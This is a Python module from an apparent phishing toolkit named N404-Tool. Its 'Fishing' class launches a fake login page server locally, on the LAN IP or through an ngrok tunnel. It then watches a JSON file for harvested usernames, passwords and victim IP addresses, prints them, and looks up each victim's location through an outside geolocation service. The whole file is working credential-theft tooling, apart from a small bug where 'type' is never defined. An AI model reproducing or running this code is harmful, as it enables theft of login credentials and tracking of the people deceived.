#!/usr/bin/python3
import threading, os, json, time, socket
from My_Style import Color
import urllib.request, requests

from tools.root import (
TOOLS_PATH,
XPATH )

db_File = TOOLS_PATH+'Fishing/SERVER/db.json'
APP_PATH = TOOLS_PATH+'Fishing/SERVER/'

class Fishing:
    def __init__(self):
        self.ToolPath = XPATH+'N404-Tool'
        self.template = None

    def start(self,page):
        self.template = page
        def serv(page):
            os.chdir(APP_PATH)
            if type=='localhost':
                server = f'python3 App.py {page} 127.0.0.1 5000'
                os.system(server+' 2> /dev/null > request.txt')
                print(Color.reader('G#[*] url : Y#http://127.0.0.1:5000\n'))

            elif type == 'ip':
                server = f'python3 App.py {page} {self.MyIp()} 8080'
                os.system(server+' 2> /dev/null > request.txt')
                print(Color.reader(f'G#[*] url : Y#http://{self.MyIp()}:8080\n'))

            elif type == 'ngrok':
                server = f'python3 App.py {page} 127.0.0.1 5000'
                os.system(server+' 2> /dev/null > request.txt')
                self.url()

            os.chdir(self.ToolPath)

        T = threading.Thread(target=serv, args=[page])
        T.daemon = True
        T.start()

    def listening(self):
        with open(db_File) as db:
            data = json.load(db)
        def LSIN(data):
            while True:
                with open(db_File) as dbs:
                    try:
                        dbs = json.load(dbs)
                    except json.decoder.JSONDecodeError:
                        dbs = {'username':False,'password':False}
                if dbs['username'] and data['username']:
                    if dbs['username'] != data['username']:
                        ipu = Color.reader(f"G#[W#*G#] ip R#:Y# {dbs['ip']}  ")
                        tem = Color.reader(f"G#[W#*G#] template R#:P# {self.template}  ")
                        use = Color.reader(f"G#[W#*G#] username R#:C# {dbs['username']}")
                        pas = Color.reader(f"G#[W#*G#] password R#:C# {dbs['password']}")
                        print(f'{ipu}{" "*9}\n{tem}\n{use}\n{pas}')
                        # location...
                        print( self.location(dbs['ip']) )
                        data = dbs
        T = threading.Thread(target=LSIN, args=[data])
        T.daemon = True
        T.start()

    def location(self,ip):
        ip = str(ip).strip()
        with urllib.request.urlopen(f"https://geolocation-db.com/jsonp/{ip}") as url:
            data = url.read().decode()
            data = json.loads(data.split("(")[1].strip(")"))
        db = str(Color.reader('Y#┌───[ location ]───>          \n'))
        for n,i in data.items():
             db += str(Color.reader(f"Y#│ G#{n} :B# {i}Y#\n"))
        db += '└─────────────────────[ CTRL+C ]>\n'
        return db

    def url(self):
        try:
            url = requests.get('http://localhost:4040/api/tunnels')
            Js = url.json()['tunnels']
            print (Color.reader(f"G#[*] url : Y#{Js[0]['public_url'].replace('http:','https:')}\n"))
        except requests.exceptions.ConnectionError:
            print (Color.reader(f"G#[*] url : R#ngrok not found!"))

    def MyIp(self):
        ip = None
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        ip = s.getsockname()[0]
        s.close()
        return ip
